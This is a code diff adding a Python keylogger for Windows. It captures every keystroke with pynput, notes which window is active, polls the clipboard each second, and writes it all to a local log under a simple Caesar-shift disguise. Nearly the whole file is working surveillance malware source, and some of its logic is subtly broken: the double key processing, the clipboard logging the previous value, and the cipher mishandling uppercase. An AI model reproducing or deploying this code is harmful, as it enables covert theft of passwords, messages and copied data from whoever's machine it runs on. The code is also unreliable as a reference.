@@ -1,0 +1,121 @@
+import pynput  
+import pyperclip  
+import logging  
+import time  
+import threading 
+from win32gui import GetWindowText, GetForegroundWindow  
+
+# global variables:
+last_window = " "  # used to check changing the windows
+ctrl = alt = shift = tab = cmnd = False  
+stroke = "" 
+
+# keystrokes
+ctrl_data = {"\\x01": 'a', "\\x02": 'b', "\\x03": 'c', '\\x04': 'd', '\\x05': 'e', '\\x06': 'f', '\\x07': 'g',
+             '\\x08': 'h',
+             '\\t': 'i', '\\n': 'j', '\\x0b': 'k',
+             '\\x0c': 'l', '\\r': 'm', '\\x0e': 'n',
+             '\\x0f': 'o', '\\x10': 'p', '\\x11': 'q', '\\x12': 'r', '\\x13': 's', '\\x14': 't', '\\x15': 'u',
+             '\\x16': 'v', '\\x17': 'w', '\\x18': 'x', '\\x19': 'y', '\\x1a': 'z',
+             "<186>": ";", "<187>": "=", "<189>": "-", "<188>": ",", "<190>": ".", "<191>": "/",
+             "<222>": "'", "\\x1b": "[", "\\x1d": "]", "": "'",
+             "<97>": "1", "<98>": "2", "<99>": "3", "<100>": "4",
+             "<101>": "5", "<102>": "6", "<103>": "7", "<104>": "8", '<105>': "9"}
+
+
+
+
+#  encrypt function 
+def caeser_shift(string: str):
+    shift_amount = 6  
+    encrypted_string = ""
+    for i in range(0, len(string)):  
+        letter = string[i]  
+
+        if letter.islower(): 
+            encrypted_string += chr((ord(letter) + shift_amount - 97) % 26 + 97)  
+          
+        elif letter.isupper():  
+            encrypted_string += chr((ord(letter) - 65 + shift_amount) % 26 + 97)  
+        else:
+            encrypted_string += letter  
+
+    return encrypted_string  
+
+
+# functioncleans keystroke
+def stroke_process(key: str):
+    # global variables used in this function
+    global ctrl, shift, tab, cmnd, alt, stroke
+    
+    key = str(key).replace("Key.", "").strip()
+    
+    if key in ["ctrl_l", "ctrl_r", "ctrl"]:
+        ctrl = True
+        stroke += "ctrl + "
+    elif key == "cmnd":
+        cmnd = True
+        stroke += "cmnd + "
+    elif key == "tab":
+        tab = True
+        stroke += "tab + "
+    elif key in ["alt_l", "alt_r", "alt"]:
+        alt = True
+        stroke += "alt + "
+    elif key in ["shift_l", "shift_r", "shift"]:
+        shift = True
+        stroke += "shift + "
+
+   
+    else:
+        key = key.replace("'", "")
+        
+        if key in ctrl_data:  
+            key = ctrl_data[key]  
+        key = stroke + key 
+        
+        stroke = ""  
+        return key
+
+
+# opens the log file, where we will write all the keystrokes pressed
+logging.basicConfig(filename="logs.log", level=logging.INFO, format='%(asctime)s: %(message)s')
+
+
+# function executed once a key is pressed
+def on_press(key):
+    global last_window
+    window_name = str(GetWindowText(GetForegroundWindow())).replace("*", "")  
+    if window_name == "":  
+        window_name = "Desktop"
+    if window_name != last_window:  
+        logging.info("\n" + ("-" * 100) + "\nswitched to screen: " + window_name)  
+        last_window = window_name 
+    key = stroke_process(key) 
+    if key is not None:
+        logging.info(caeser_shift(stroke_process(key))) 
+
+
+
+def keylogger():
+    with pynput.keyboard.Listener(on_press=on_press) as listen:  
+        
+        listen.join()  
+
+# function to check for the clipboard
+def clipboard():
+    previous_clip = ""  
+    while True:  
+        clip = pyperclip.paste()  
+        if previous_clip != clip:  
+            logging.info('Clipped ' + caeser_shift(previous_clip))  
+            previous_clip = clip  
+        time.sleep(1)  
+
+
+
+clipboard_thread = threading.Thread(target=clipboard)
+keylogger_thread = threading.Thread(target=keylogger) 
+
+clipboard_thread.start()  
+keylogger_thread.start()  
